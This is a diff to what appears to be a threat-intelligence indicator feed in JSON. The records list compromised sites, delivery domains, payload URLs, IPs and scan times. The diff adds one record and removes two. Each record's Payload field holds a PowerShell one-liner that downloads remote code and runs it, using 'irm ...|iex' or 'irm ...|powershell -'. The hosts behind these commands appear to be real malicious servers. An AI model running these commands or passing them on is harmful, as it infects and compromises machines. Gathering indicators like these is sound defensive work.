@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "castorinvestments.pl",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/ben/1e715b77597ae0f6"
+    ],
+    "IP": [
+      "92.222.139.190"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/ben/1e715b77597ae0f6')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/ben/1e715b77597ae0f6"
+    ],
+    "ReportId": "cmwqapek9261d0omlk180kgle",
+    "ScannedAt": "2026-11-21T10:59:06.660000+00:00"
+  },
+  {
     "UrlDomain": "innvantage.skstechsolution.us",
     "DeliveryUrl": [
       "friendsoftorreabbey.com"
@@ -11911,43 +11930,5 @@
     ],
     "ReportId": "cmwexnoie0eja0omldix6i9jb",
     "ScannedAt": "2026-11-13T12:08:23.297000+00:00"
-  },
-  {
-    "UrlDomain": "wheelspacers.ca",
-    "DeliveryUrl": [
-      "content-collector.com"
-    ],
-    "PayloadUrl": [
-      "https://content-collector.com/6snqpNaX8nyGX0an"
-    ],
-    "IP": [
-      "74.208.236.197"
-    ],
-    "Related": [],
-    "Payload": "powershell -c \\\"irm 'https://content-collector[.]com/6snqpNaX8nyGX0an'|powershell -\\\"",
-    "ResolvedDownloadUrl": [
-      "https://content-collector.com/6snqpNaX8nyGX0an"
-    ],
-    "ReportId": "cmwevvgz70ehn0omlu85kdsak",
-    "ScannedAt": "2026-11-13T11:18:27.500000+00:00"
-  },
-  {
-    "UrlDomain": "molecules.in",
-    "DeliveryUrl": [
-      "content-collector.com"
-    ],
-    "PayloadUrl": [
-      "https://content-collector.com/6snqpNaX8nyGX0an"
-    ],
-    "IP": [
-      "45.113.122.205"
-    ],
-    "Related": [],
-    "Payload": "powershell -c \\\"irm 'https://content-collector[.]com/6snqpNaX8nyGX0an'|powershell -\\\"",
-    "ResolvedDownloadUrl": [
-      "https://content-collector.com/6snqpNaX8nyGX0an"
-    ],
-    "ReportId": "cmwevvd0i0eh70omlobj2ua4c",
-    "ScannedAt": "2026-11-13T11:18:22.425000+00:00"
   }
 ]
